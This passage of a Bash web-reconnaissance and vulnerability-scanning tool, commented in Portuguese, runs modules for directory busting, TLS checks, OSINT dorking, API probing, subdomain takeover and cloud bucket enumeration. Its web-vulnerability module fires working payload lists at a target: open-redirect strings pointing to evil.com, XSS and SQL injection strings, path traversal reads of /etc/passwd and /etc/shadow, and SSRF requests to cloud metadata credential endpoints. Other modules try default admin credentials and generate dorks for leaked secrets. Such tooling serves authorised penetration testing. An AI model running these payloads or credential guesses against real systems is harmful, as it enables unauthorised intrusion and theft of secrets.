                [[ "$code" == "200" ]] && log_vuln "CRITICAL: .env exposto! ${url}"
                ;;
            .git/*)
                [[ "$code" == "200" ]] && log_vuln "CRITICAL: Repositório .git exposto! ${url}"
                ;;
            *backup*|*.sql|*.tar.gz|*.zip)
                [[ "$code" == "200" ]] && log_vuln "Arquivo de backup exposto: ${url}"
                ;;
            phpinfo*|info.php|test.php)
                [[ "$code" == "200" ]] && log_vuln "phpinfo() exposto: ${url}"
                ;;
            actuator/*)
                [[ "$code" == "200" ]] && log_vuln "Spring Boot Actuator exposto: ${url}"
                ;;
            wp-json/wp/v2/users)
                [[ "$code" == "200" ]] && log_vuln "WordPress users API aberta: ${url}"
                ;;
            robots.txt|sitemap.xml)
                [[ "$code" == "200" ]] && {
                    log_find "Arquivo público: ${url}"
                    local content; content="$(http_get "$url")"
                    echo "$content" > "${tdir}/web/$(basename "$path").txt"
                }
                ;;
        esac

        # Progresso a cada 20
        (( tested % 20 == 0 )) && progress "$tested" "${#paths[@]}" "diretórios"
        rate_sleep
    done
    echo ""

    log_info "Dir busting: ${found} paths descobertos de ${tested} testados"

    # Testar arquivos de backup por padrão de nome de domínio
    local domain_backups=(
        "${DOMAIN}.zip" "${DOMAIN}.tar.gz" "${DOMAIN}.bak"
        "${DOMAIN/./-}.zip" "www.zip" "www.tar.gz"
        "backup_${DOMAIN}.sql" "${DOMAIN}_backup.zip"
    )
    log_info "Testando backups por nome de domínio..."
    for bk in "${domain_backups[@]}"; do
        local bk_url="${base_url}/${bk}"
        local bk_code; bk_code="$(http_status "$bk_url")"
        if [[ "$bk_code" == "200" ]]; then
            log_vuln "Backup do domínio exposto: ${bk_url}"
            echo "200-BACKUP $bk_url" >> "$dir_file"
        fi
    done

    log_info "Enumeração de diretórios concluída → ${dir_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 7 — SSL/TLS ANÁLISE
# ──────────────────────────────────────────────────────────────────────────────
module_ssl() {
    local tdir="$1"
    log_sect "MÓDULO: ANÁLISE SSL/TLS"

    if ! check_cmd openssl; then
        log_warn "openssl não disponível — pulando módulo SSL"
        return 0
    fi

    local ssl_file="${tdir}/web/ssl_info.txt"

    # Obter certificado
    log_info "Obtendo certificado SSL de ${DOMAIN}:443..."
    local cert_info
    cert_info="$(echo | timeout "$TIMEOUT" openssl s_client \
        -connect "${DOMAIN}:443" \
        -servername "$DOMAIN" 2>/dev/null | \
        openssl x509 -noout -text 2>/dev/null)"

    if [[ -z "$cert_info" ]]; then
        log_warn "Não foi possível obter certificado SSL"
        return 0
    fi

    echo "$cert_info" > "$ssl_file"

    # Extrair informações
    local subject;    subject="$(echo "$cert_info"    | grep "Subject:" | head -1 | sed 's/.*Subject: //')"
    local issuer;     issuer="$(echo "$cert_info"     | grep "Issuer:"  | head -1 | sed 's/.*Issuer: //')"
    local not_before; not_before="$(echo "$cert_info" | grep "Not Before" | cut -d: -f2- | xargs)"
    local not_after;  not_after="$(echo "$cert_info"  | grep "Not After"  | cut -d: -f2- | xargs)"
    local san;        san="$(echo "$cert_info"        | grep -A1 "Subject Alternative Name" | tail -1 | tr ',' '\n' | grep "DNS:" | sed 's/DNS://g' | xargs)"

    log_find "Subject    : ${subject}"
    log_find "Issuer     : ${issuer}"
    log_find "Válido de  : ${not_before}"
    log_find "Válido até : ${not_after}"

    if [[ -n "$san" ]]; then
        log_find "SANs (Subject Alt Names):"
        echo "$san" | tr ' ' '\n' | while read -r s; do
            [[ -n "$s" ]] && echo -e "  ${LGREEN}→${RESET} ${s}"
        done
    fi

    # Verificar expiração
    local exp_epoch; exp_epoch="$(date -d "$not_after" +%s 2>/dev/null || date -j -f "%b %d %T %Y %Z" "$not_after" +%s 2>/dev/null || echo 0)"
    local now_epoch; now_epoch="$(date +%s)"
    local days_left=$(( (exp_epoch - now_epoch) / 86400 ))

    if (( days_left < 0 )); then
        log_vuln "CERTIFICADO EXPIRADO há $(( -days_left )) dias!"
    elif (( days_left < 30 )); then
        log_warn "Certificado expira em ${days_left} dias — renovar em breve"
    else
        log_find "Certificado válido por mais ${days_left} dias"
    fi

    # Testar versões inseguras de SSL/TLS
    log_info "Testando protocolos SSL/TLS inseguros..."
    local insecure_protos=("ssl2" "ssl3" "tls1" "tls1_1")
    for proto in "${insecure_protos[@]}"; do
        local result
        result="$(echo | timeout 5 openssl s_client \
            -connect "${DOMAIN}:443" \
            -"${proto}" 2>&1 | grep -E "Cipher|CONNECTED|HANDSHAKE" | head -1)"
        if echo "$result" | grep -q "CONNECTED\|Cipher"; then
            log_vuln "Protocolo inseguro habilitado: ${proto^^}"
            echo "INSECURE_PROTO: $proto" >> "${tdir}/vulns/ssl_issues.txt"
        fi
    done

    # Testar cipher suites fracas
    log_info "Verificando cipher suites..."
    local weak_ciphers=("RC4-SHA" "RC4-MD5" "DES-CBC3-SHA" "EXP-RC4-MD5" "NULL-MD5" "NULL-SHA")
    for cipher in "${weak_ciphers[@]}"; do
        local result
        result="$(echo | timeout 5 openssl s_client \
            -connect "${DOMAIN}:443" \
            -cipher "$cipher" 2>&1 | grep "CONNECTED" | head -1)"
        if [[ -n "$result" ]]; then
            log_vuln "Cipher fraco aceito: ${cipher}"
            echo "WEAK_CIPHER: $cipher" >> "${tdir}/vulns/ssl_issues.txt"
        fi
    done

    # Certificate Transparency check
    log_info "Verificando Certificate Transparency..."
    local ct_data; ct_data="$(http_get "https://crt.sh/?q=${DOMAIN}&output=json")"
    if [[ -n "$ct_data" ]]; then
        local cert_count; cert_count="$(echo "$ct_data" | grep -c '"id"' || echo 0)"
        log_find "Total de certificados históricos em crt.sh: ${cert_count}"
    fi

    log_info "Análise SSL/TLS concluída → ${ssl_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 8 — TESTES DE VULNERABILIDADES WEB
# ──────────────────────────────────────────────────────────────────────────────
module_web_vulns() {
    local tdir="$1"
    log_sect "MÓDULO: TESTES DE VULNERABILIDADES WEB"

    local base_url="https://${DOMAIN}"
    local status; status="$(http_status "$base_url")"
    [[ "$status" == "000" ]] && base_url="http://${DOMAIN}"

    # ── 8.1 Open Redirect ──
    log_info "Testando Open Redirect..."
    local redirect_payloads=(
        "//evil.com" "///evil.com" "////evil.com"
        "https://evil.com" "http://evil.com"
        "//evil.com/%2F.." "https://evil.com/..%2f"
        "%2F%2Fevil.com" "%5C%5Cevil.com"
        "//google.com@evil.com"
    )
    local redirect_params=("redirect" "url" "next" "return" "returnUrl" "returnTo" \
                           "redirect_uri" "callback" "goto" "target" "destination" \
                           "redir" "redirect_url" "forward" "location" "continue")

    for param in "${redirect_params[@]}"; do
        for payload in "${redirect_payloads[@]}"; do
            local test_url="${base_url}/?${param}=${payload}"
            local response_headers; response_headers="$(http_head "$test_url")"
            local location; location="$(echo "$response_headers" | grep -i '^location:' | tr -d '\r')"
            if echo "$location" | grep -qi "evil.com"; then
                log_vuln "Open Redirect em: ${test_url}"
                echo "OPEN_REDIRECT: $test_url -> $location" >> "${tdir}/vulns/open_redirect.txt"
            fi
        done
    done

    # ── 8.2 Reflected XSS (básico) ──
    log_info "Testando Reflected XSS (básico)..."
    local xss_payloads=(
        '<script>alert(1)</script>'
        '"><script>alert(1)</script>'
        "';alert(1)//"
        '<img src=x onerror=alert(1)>'
        '"><img src=x onerror=alert(1)>'
        'javascript:alert(1)'
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E'
        '<svg onload=alert(1)>'
        '"onmouseover="alert(1)"'
    )
    local xss_params=("q" "s" "search" "query" "id" "name" "value" "text" \
                      "input" "msg" "message" "comment" "term" "keyword" "p")

    for param in "${xss_params[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            local test_url="${base_url}/?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")"
            local response; response="$(http_get "$test_url")"
            if echo "$response" | grep -qF "$payload" 2>/dev/null; then
                log_vuln "Reflected XSS em: ${base_url}?${param}=..."
                echo "XSS: ${base_url}?${param}=[payload]" >> "${tdir}/vulns/xss.txt"
                break  # Um por param
            fi
        done
    done

    # ── 8.3 SQL Injection (error-based) ──
    log_info "Testando SQL Injection (error-based)..."
    local sqli_payloads=(
        "'" '"' "1'" "1'--" "1'/*" "' OR '1'='1"
        "1 AND 1=1" "1 AND 1=2"
        "' OR 1=1--" "' OR 1=1#"
        "1; SELECT 1--"
        "1' ORDER BY 1--" "1' ORDER BY 100--"
    )
    local sqli_params=("id" "user" "username" "name" "product" "category" \
                       "page" "sort" "order" "filter" "search" "q")

    local sqli_errors=(
        "SQL syntax" "mysql_fetch" "ORA-0" "PostgreSQL.*ERROR"
        "Warning.*mysql_" "supplied argument is not a valid MySQL"
        "Unclosed quotation mark" "Microsoft OLE DB Provider"
        "SQLite3::query" "syntax error" "SQLSTATE"
    )

    for param in "${sqli_params[@]}"; do
        for payload in "${sqli_payloads[@]}"; do
            local enc_payload; enc_payload="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")"
            local test_url="${base_url}/?${param}=${enc_payload}"
            local response; response="$(http_get "$test_url")"
            for err in "${sqli_errors[@]}"; do
                if echo "$response" | grep -qiE "$err" 2>/dev/null; then
                    log_vuln "SQL Injection (error-based) em: ${base_url}?${param}=..."
                    echo "SQLI: ${base_url}?${param}=[payload] | Erro: $err" >> "${tdir}/vulns/sqli.txt"
                    break 2
                fi
            done
        done
    done

    # ── 8.4 Path Traversal ──
    log_info "Testando Path Traversal (LFI)..."
    local lfi_payloads=(
        "../../etc/passwd" "../../../etc/passwd"
        "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%2F..%2Fetc%2Fpasswd" "%252e%252e%252fetc%252fpasswd"
        "/etc/passwd" "/etc/shadow" "/proc/self/environ"
        "../../../../windows/win.ini" "..%5c..%5cwindows%5cwin.ini"
    )
    local lfi_params=("file" "page" "path" "include" "doc" "document" \
                      "template" "view" "load" "read" "dir" "folder")

    for param in "${lfi_params[@]}"; do
        for payload in "${lfi_payloads[@]}"; do
            local test_url="${base_url}/?${param}=${payload}"
            local response; response="$(http_get "$test_url")"
            if echo "$response" | grep -qE "root:.*:0:0:|\\[extensions\\]|for 16-bit app" 2>/dev/null; then
                log_vuln "Path Traversal/LFI em: ${base_url}?${param}=..."
                echo "LFI: ${base_url}?${param}=[payload]" >> "${tdir}/vulns/lfi.txt"
                break
            fi
        done
    done

    # ── 8.5 SSRF (básico) ──
    log_info "Testando SSRF básico..."
    local ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://100.100.100.200/latest/meta-data/"
        "file:///etc/passwd"
        "dict://127.0.0.1:6379/info"
        "gopher://127.0.0.1:6379/_info"
    )
    local ssrf_params=("url" "uri" "path" "src" "source" "target" "dest" \
                       "destination" "proxy" "fetch" "load" "image" "img")

    for param in "${ssrf_params[@]}"; do
        for payload in "${ssrf_payloads[@]}"; do
            local enc_payload; enc_payload="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")"
            local test_url="${base_url}/?${param}=${enc_payload}"
            local response; response="$(http_get "$test_url")"
            if echo "$response" | grep -qiE "ami-id|instance-id|security-credentials|computeMetadata|root:.*:0:0:" 2>/dev/null; then
                log_vuln "SSRF em: ${base_url}?${param}=..."
                echo "SSRF: ${base_url}?${param}=[payload]" >> "${tdir}/vulns/ssrf.txt"
                break
            fi
        done
    done

    # ── 8.6 SSTI — Server-Side Template Injection ──
    log_info "Testando SSTI (Server-Side Template Injection)..."
    local ssti_payloads=(
        '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}'
        '{{7*"7"}}' '{{"7"*7}}'
        '${{7*7}}' '#{7*7}' '%{7*7}'
        '{{config}}' '{{self}}' '{{request}}'
    )
    local ssti_params=("name" "input" "template" "q" "search" "msg")

    for param in "${ssti_params[@]}"; do
        for payload in "${ssti_payloads[@]}"; do
            local enc; enc="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")"
            local response; response="$(http_get "${base_url}/?${param}=${enc}")"
            if echo "$response" | grep -qE '\b49\b|\b77\b' 2>/dev/null; then
                log_vuln "SSTI detectado em: ${base_url}?${param}=..."
                echo "SSTI: ${base_url}?${param}=[payload]" >> "${tdir}/vulns/ssti.txt"
                break
            fi
        done
    done

    # ── 8.7 CSRF — Verificação de tokens ──
    log_info "Verificando proteção CSRF..."
    local html; html="$(http_get "$base_url")"
    if [[ -n "$html" ]]; then
        if echo "$html" | grep -qiE "<form"; then
            if ! echo "$html" | grep -qiE "csrf|_token|nonce|authenticity_token"; then
                log_vuln "Formulários sem token CSRF detectados"
                echo "CSRF: Forms without CSRF tokens" >> "${tdir}/vulns/csrf.txt"
            else
                log_find "Tokens CSRF encontrados nos formulários"
            fi
        fi
    fi

    # ── 8.8 Host Header Injection ──
    log_info "Testando Host Header Injection..."
    local hhi_response
    hhi_response="$(curl -s -L --max-time "$TIMEOUT" -A "$USER_AGENT" \
        -H "Host: evil.com" \
        "$base_url" 2>/dev/null)"
    if echo "$hhi_response" | grep -qi "evil.com"; then
        log_vuln "Host Header Injection possível"
        echo "HOST_HEADER: reflected in response" >> "${tdir}/vulns/misc.txt"
    fi

    # ── 8.9 Clickjacking ──
    log_info "Verificando Clickjacking..."
    local frame_headers; frame_headers="$(http_head "$base_url")"
    if ! echo "$frame_headers" | grep -qiE "X-Frame-Options:|frame-ancestors"; then
        log_vuln "Clickjacking: sem proteção de framing detectada"
    fi

    log_info "Testes de vulnerabilidades web concluídos → ${tdir}/vulns/"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 9 — VAZAMENTO DE INFORMAÇÕES / OSINT
# ──────────────────────────────────────────────────────────────────────────────
module_osint() {
    local tdir="$1"
    log_sect "MÓDULO: OSINT / VAZAMENTO DE INFORMAÇÕES"

    # Shodan (sem API — via HTML scrape básico)
    log_info "Consultando Shodan (sem API)..."
    local shodan; shodan="$(http_get "https://www.shodan.io/host/$(resolve_ip "$DOMAIN")" \
        -H "Accept: text/html")"
    if [[ -n "$shodan" ]]; then
        local shodan_ports; shodan_ports="$(echo "$shodan" | grep -oE 'port-[0-9]+' | sort -u | sed 's/port-//')"
        [[ -n "$shodan_ports" ]] && log_find "Shodan - portas indexadas: $shodan_ports"
    fi

    # Wayback Machine — URLs históricas
    log_info "Consultando Wayback Machine (URLs históricas)..."
    local wayback; wayback="$(http_get "http://web.archive.org/cdx/search/cdx?url=${DOMAIN}/*&output=text&fl=original&collapse=urlkey&limit=100")"
    if [[ -n "$wayback" ]]; then
        echo "$wayback" > "${tdir}/recon/wayback_urls.txt"
        local wb_count; wb_count="$(echo "$wayback" | wc -l)"
        log_find "Wayback Machine: ${wb_count} URLs históricas"

        # Buscar URLs sensíveis no histórico
        echo "$wayback" | grep -iE "\.env|config|backup|admin|api|password|secret|token|key" | \
            head -20 | while read -r url; do
                log_find "URL histórica sensível: ${url}"
            done
    fi

    # GitHub — dorks para o domínio
    log_info "Gerando GitHub Dorks..."
    local github_dorks=(
        "https://github.com/search?q=${DOMAIN}+password&type=code"
        "https://github.com/search?q=${DOMAIN}+secret&type=code"
        "https://github.com/search?q=${DOMAIN}+api_key&type=code"
        "https://github.com/search?q=${DOMAIN}+token&type=code"
        "https://github.com/search?q=${DOMAIN}+credential&type=code"
    )
    {
        echo "# GitHub Dorks para ${DOMAIN}"
        echo "# Verifique manualmente no navegador:"
        for dork in "${github_dorks[@]}"; do
            echo "$dork"
        done
    } > "${tdir}/recon/github_dorks.txt"
    log_find "GitHub Dorks gerados → recon/github_dorks.txt"

    # Google Dorks
    log_info "Gerando Google Dorks..."
    local google_dorks=(
        "site:${DOMAIN} filetype:env"
        "site:${DOMAIN} filetype:sql"
        "site:${DOMAIN} filetype:log"
        "site:${DOMAIN} filetype:xml inurl:config"
        "site:${DOMAIN} inurl:admin"
        "site:${DOMAIN} inurl:login"
        "site:${DOMAIN} inurl:api"
        "site:${DOMAIN} \"password\""
        "site:${DOMAIN} \"api_key\""
        "site:${DOMAIN} \"secret_key\""
        "site:${DOMAIN} intext:\"Index of /\""
        "inurl:${DOMAIN} filetype:php intext:\"mysql_connect\""
        "\"@${DOMAIN}\" site:pastebin.com"
        "\"${DOMAIN}\" site:trello.com"
    )
    {
        echo "# Google Dorks para ${DOMAIN}"
        echo "# Use: https://www.google.com/search?q=DORK"
        echo ""
        for dork in "${google_dorks[@]}"; do
            echo "$dork"
            echo "→ https://www.google.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${dork}'))" 2>/dev/null)"
            echo ""
        done
    } > "${tdir}/recon/google_dorks.txt"
    log_find "Google Dorks gerados → recon/google_dorks.txt"

    # Leaked credentials check via dehashed/leakcheck (sem API)
    log_info "Verificando Pastebin/PasteSite leaks..."
    local paste_check; paste_check="$(http_get "https://psbdmp.ws/api/search/${DOMAIN}" 2>/dev/null)"
    if [[ -n "$paste_check" ]] && ! echo "$paste_check" | grep -qi "error\|not found"; then
        echo "$paste_check" > "${tdir}/recon/pastebin_leaks.json"
        log_vuln "Possíveis leaks no Pastebin encontrados → recon/pastebin_leaks.json"
    fi

    # Arquivos robots.txt / sitemap para intel
    log_info "Analisando robots.txt e sitemap..."
    local robots; robots="$(http_get "https://${DOMAIN}/robots.txt")"
    if [[ -n "$robots" ]] && ! echo "$robots" | grep -qi "not found\|404"; then
        echo "$robots" > "${tdir}/recon/robots.txt"
        local disallowed; disallowed="$(echo "$robots" | grep -i "Disallow:" | awk '{print $2}')"
        if [[ -n "$disallowed" ]]; then
            log_find "Paths no robots.txt (Disallow):"
            echo "$disallowed" | head -20 | while read -r p; do
                echo -e "  ${YELLOW}→${RESET} ${p}"
            done
        fi
    fi

    # Metadata de arquivos via FOCA-like approach
    log_info "Buscando arquivos para extração de metadados..."
    local doc_exts=("pdf" "doc" "docx" "xls" "xlsx" "ppt" "pptx")
    local doc_urls=()
    for ext in "${doc_exts[@]}"; do
        local found_urls; found_urls="$(http_get "https://www.google.com/search?q=site:${DOMAIN}+filetype:${ext}" 2>/dev/null | \
            grep -oE "https?://[^\"' ]*\.${ext}" | sort -u)"
        [[ -n "$found_urls" ]] && doc_urls+=($found_urls)
    done

    if [[ ${#doc_urls[@]} -gt 0 ]]; then
        log_find "${#doc_urls[@]} documentos encontrados para análise de metadados"
        printf '%s\n' "${doc_urls[@]}" > "${tdir}/recon/documents.txt"
    fi

    log_info "OSINT concluído → ${tdir}/recon/"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 10 — TESTES DE API
# ──────────────────────────────────────────────────────────────────────────────
module_api_tests() {
    local tdir="$1"
    log_sect "MÓDULO: TESTES DE API"

    local base_url="https://${DOMAIN}"
    local api_file="${tdir}/web/api_findings.txt"

    # Endpoints de API comuns para testar
    local api_endpoints=(
        "/api/v1/users" "/api/v1/user" "/api/v1/admin"
        "/api/v2/users" "/api/v2/user"
        "/api/users" "/api/user" "/api/admin"
        "/api/v1/me" "/api/me" "/api/profile"
        "/api/v1/config" "/api/v1/settings"
        "/api/v1/keys" "/api/v1/token"
        "/rest/v1/users" "/rest/api/users"
        "/graphql" "/graphiql" "/api/graphql"
    )

    log_info "Testando endpoints de API..."
    for endpoint in "${api_endpoints[@]}"; do
        local url="${base_url}${endpoint}"
        local code; code="$(http_status "$url")"
        local response; response="$(http_get "$url")"

        if [[ "$code" == "200" ]]; then
            log_find "API Endpoint: ${LGREEN}${url}${RESET} [${code}]"
            echo "200 $url" >> "$api_file"

            # Verificar se retorna dados sensíveis
            if echo "$response" | grep -qiE "password|passwd|secret|token|api_key|credential"; then
                log_vuln "API expõe dados sensíveis: ${url}"
            fi

            # Verificar se é paginável (IDOR potential)
            if echo "$response" | grep -qE '"id":|"user_id":|"uuid":'; then
                log_find "Campos de ID encontrados — testar IDOR em: ${url}"
                echo "IDOR_CANDIDATE: $url" >> "${tdir}/vulns/idor_candidates.txt"
            fi
        elif [[ "$code" == "401" || "$code" == "403" ]]; then
            echo "$code $url" >> "$api_file"
        fi
        rate_sleep
    done

    # Testar métodos HTTP inseguros
    log_info "Testando métodos HTTP..."
    local methods=("OPTIONS" "TRACE" "PUT" "DELETE" "PATCH" "HEAD" "CONNECT")
    for method in "${methods[@]}"; do
        local result; result="$(curl -s -o /dev/null -w "%{http_code}" \
            -X "$method" \
            --max-time "$TIMEOUT" \
            -A "$USER_AGENT" \
            "$base_url" 2>/dev/null)"

        case "$method" in
            OPTIONS)
                local allow; allow="$(curl -s -I -X OPTIONS "$base_url" 2>/dev/null | grep -i '^Allow:' | tr -d '\r')"
                [[ -n "$allow" ]] && log_find "Métodos permitidos: $allow"
                ;;
            TRACE)
                [[ "$result" == "200" ]] && log_vuln "TRACE habilitado — XST possível"
                ;;
            PUT)
                [[ "$result" == "200" || "$result" == "201" ]] && \
                    log_vuln "Método PUT habilitado em /"
                ;;
            DELETE)
                [[ "$result" == "200" ]] && \
                    log_vuln "Método DELETE habilitado em /"
                ;;
        esac
    done

    # Testar autenticação básica fraca
    log_info "Testando credenciais padrão em endpoints de admin..."
    local creds=("admin:admin" "admin:password" "admin:123456" "root:root" \
                 "admin:" "test:test" "guest:guest" "user:user")
    local admin_paths=("/admin" "/admin/" "/wp-admin/" "/administrator/" "/manager/")

    for cred in "${creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        for apath in "${admin_paths[@]}"; do
            local code; code="$(curl -s -o /dev/null -w "%{http_code}" \
                -u "${user}:${pass}" \
                --max-time "$TIMEOUT" \
                "${base_url}${apath}" 2>/dev/null)"
            if [[ "$code" == "200" ]]; then
                log_vuln "Credencial padrão funciona: ${cred} em ${base_url}${apath}"
                echo "DEFAULT_CRED: $cred @ ${base_url}${apath}" >> "${tdir}/vulns/default_creds.txt"
            fi
        done
    done

    # GraphQL introspection
    log_info "Testando GraphQL introspection..."
    local gql_payload='{"query":"{__schema{types{name}}}"}'
    local gql_response; gql_response="$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$gql_payload" \
        --max-time "$TIMEOUT" \
        "${base_url}/graphql" 2>/dev/null)"

    if echo "$gql_response" | grep -q "__schema"; then
        log_vuln "GraphQL Introspection habilitada — vazamento de schema"
        echo "$gql_response" > "${tdir}/vulns/graphql_schema.json"
    fi

    log_info "Testes de API concluídos → ${api_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 12 — SUBDOMAIN TAKEOVER
# ──────────────────────────────────────────────────────────────────────────────
module_takeover() {
    local tdir="$1"
    log_sect "MÓDULO: SUBDOMAIN TAKEOVER"

    local sub_file="${tdir}/subdomains/all_subdomains.txt"
    local takeover_file="${tdir}/vulns/takeover_candidates.txt"
    : > "$takeover_file"

    # Fingerprints de serviços vulneráveis a takeover
    declare -A TAKEOVER_SIGS
    TAKEOVER_SIGS["github.io"]="There isn't a GitHub Pages site here"
    TAKEOVER_SIGS["herokuapp.com"]="No such app"
    TAKEOVER_SIGS["s3.amazonaws.com"]="NoSuchBucket"
    TAKEOVER_SIGS["azurewebsites.net"]="404 Web Site not found"
    TAKEOVER_SIGS["cloudapp.net"]="404 Web Site not found"
    TAKEOVER_SIGS["trafficmanager.net"]="404 Web Site not found"
    TAKEOVER_SIGS["zendesk.com"]="Help Center Closed"
    TAKEOVER_SIGS["freshdesk.com"]="May be this is still fresh"
    TAKEOVER_SIGS["readme.io"]="Project doesnt exist"
    TAKEOVER_SIGS["statuspage.io"]="You are being redirected"
    TAKEOVER_SIGS["fastly.net"]="Fastly error: unknown domain"
    TAKEOVER_SIGS["shopify.com"]="Sorry, this shop is currently unavailable"
    TAKEOVER_SIGS["surge.sh"]="project not found"
    TAKEOVER_SIGS["tumblr.com"]="Whatever you were looking for doesn't currently exist"
    TAKEOVER_SIGS["unbounce.com"]="The requested URL was not found"
    TAKEOVER_SIGS["helpscout.net"]="No settings were found for this company"
    TAKEOVER_SIGS["pantheon.io"]="404 error unknown site"
    TAKEOVER_SIGS["wpengine.com"]="The site you were looking for couldn't be found"
    TAKEOVER_SIGS["ghost.io"]="404 - Not Found for url"
    TAKEOVER_SIGS["bitbucket.io"]="Repository not found"
    TAKEOVER_SIGS["netlify.com"]="Not Found - Request ID"
    TAKEOVER_SIGS["webflow.io"]="The page you are looking for doesn't exist"
    TAKEOVER_SIGS["fly.dev"]="404 - Not Found"

    if [[ ! -f "$sub_file" ]] || [[ ! -s "$sub_file" ]]; then
        log_warn "Lista de subdomínios vazia — executando enumeração rápida via crt.sh..."
        local crt_data; crt_data="$(http_get "https://crt.sh/?q=%.${DOMAIN}&output=json" 2>/dev/null)"
        mkdir -p "${tdir}/subdomains"
        : > "$sub_file"
        if [[ -n "$crt_data" ]]; then
            echo "$crt_data" | grep -oE '"name_value":"[^"]*"' | cut -d'"' -f4 | \
                sed 's/\\n/\n/g' | grep -E "\.${DOMAIN}$" | grep -v '^\*' | \
                sort -u >> "$sub_file"
        fi
    fi

    local checked=0 candidates=0

    while IFS= read -r sub; do
        [[ -z "$sub" ]] && continue
        ((checked++))

        # Verificar CNAMEs para detectar dangling
        local cname=""
        if check_cmd dig; then
            cname="$(dig +short CNAME "$sub" 2>/dev/null | head -1 | sed 's/\.$//')"
        fi

        if [[ -n "$cname" ]]; then
            log_debug "CNAME: ${sub} → ${cname}"

            # Checar se o CNAME aponta para um serviço de terceiro
            for service in "${!TAKEOVER_SIGS[@]}"; do
                if echo "$cname" | grep -qi "$service"; then
                    local sig="${TAKEOVER_SIGS[$service]}"
                    # Buscar fingerprint na página
                    local response; response="$(http_get "http://${sub}" 2>/dev/null || true)"
                    if echo "$response" | grep -qi "$sig" 2>/dev/null; then
                        add_finding "CRITICAL" "Subdomain Takeover: ${sub}" \
                            "CNAME → ${cname} (${service}) com fingerprint de serviço sem dono" "takeover"
                        echo "TAKEOVER|${sub}|CNAME:${cname}|SERVICE:${service}" >> "$takeover_file"
                        ((candidates++))
                    elif ! resolve_ip "$cname" &>/dev/null; then
                        # CNAME para host que não resolve = dangling
                        add_finding "HIGH" "Dangling CNAME: ${sub}" \
                            "CNAME aponta para ${cname} que não resolve — possível takeover" "takeover"
                        echo "DANGLING_CNAME|${sub}|${cname}" >> "$takeover_file"
                        ((candidates++))
                    fi
                    break
                fi
            done
        fi

        # Verificar subdomínios que retornam NXDOMAIN mas estão listados
        if ! resolve_ip "$sub" &>/dev/null && [[ -z "$cname" ]]; then
            log_debug "NXDOMAIN para: ${sub}"
        fi

        rate_sleep
    done < "$sub_file"

    log_info "Takeover: ${checked} subdomínios verificados, ${candidates} candidatos"
    [[ $candidates -gt 0 ]] && log_find "Candidatos salvos em: ${takeover_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 13 — CLOUD EXPOSURE (S3, Azure, GCP)
# ──────────────────────────────────────────────────────────────────────────────
module_cloud() {
    local tdir="$1"
    log_sect "MÓDULO: CLOUD EXPOSURE (AWS S3 / Azure / GCP)"

    local cloud_file="${tdir}/recon/cloud_findings.txt"
    : > "$cloud_file"

    local domain_words
    mapfile -t domain_words < <(echo "$DOMAIN" | sed 's/\..*//' | tr '-' '\n'; \
                                echo "$DOMAIN" | sed 's/\..*//')
    local base_name="${domain_words[0]:-$DOMAIN}"

    # ── AWS S3 Buckets ──
    log_info "Testando AWS S3 Buckets..."
    local s3_variants=(
        "${base_name}"
        "${base_name}-backup"
        "${base_name}-backups"
        "${base_name}-dev"
        "${base_name}-staging"
        "${base_name}-prod"
        "${base_name}-assets"
        "${base_name}-static"
        "${base_name}-media"
        "${base_name}-uploads"
        "${base_name}-data"
        "${base_name}-files"
        "${base_name}-logs"
        "${base_name}-public"
        "${base_name}-private"
        "${base_name}-test"
        "${base_name}-www"
        "${base_name}.com"
        "www.${base_name}"
        "${base_name}2"
        "s3.${base_name}"
        "${base_name}-s3"
    )

    for bucket in "${s3_variants[@]}"; do
        # Formato direto S3
        local s3_url="https://${bucket}.s3.amazonaws.com"
        local s3_code; s3_code="$(http_status "$s3_url")"
        local s3_response; s3_response="$(http_get "$s3_url")"

        case "$s3_code" in
            200)
                if echo "$s3_response" | grep -q "ListBucketResult"; then
                    add_finding "CRITICAL" "S3 Bucket Público: ${bucket}" \
                        "Bucket acessível e listável: ${s3_url}" "cloud"
                    echo "S3_PUBLIC_LISTABLE|${s3_url}" >> "$cloud_file"
                else
                    add_finding "HIGH" "S3 Bucket Acessível: ${bucket}" \
                        "Bucket retorna 200 sem listagem: ${s3_url}" "cloud"
                    echo "S3_PUBLIC|${s3_url}" >> "$cloud_file"
                fi
                ;;
            403)
                log_find "S3 bucket existe (403): ${bucket}"
                echo "S3_EXISTS_403|${s3_url}" >> "$cloud_file"
                ;;
            301|307)
                log_find "S3 redirect: ${bucket}"
                ;;
        esac

        # Formato path-based
        local s3_path_url="https://s3.amazonaws.com/${bucket}"
        local s3p_code; s3p_code="$(http_status "$s3_path_url")"
        if [[ "$s3p_code" == "200" ]] || [[ "$s3p_code" == "403" ]]; then
            log_find "S3 path-based encontrado: ${s3_path_url} [${s3p_code}]"
            echo "S3_PATH|${s3_path_url}|${s3p_code}" >> "$cloud_file"
        fi

        rate_sleep
    done

    # ── Azure Blob Storage ──
    log_info "Testando Azure Blob Storage..."
    local azure_variants=(
        "${base_name}"
        "${base_name}storage"
        "${base_name}blob"
        "${base_name}backup"
        "${base_name}assets"
    )
    for blob in "${azure_variants[@]}"; do
        local az_url="https://${blob}.blob.core.windows.net"
        local az_code; az_code="$(http_status "$az_url")"
        if [[ "$az_code" == "200" ]] || [[ "$az_code" == "400" ]]; then
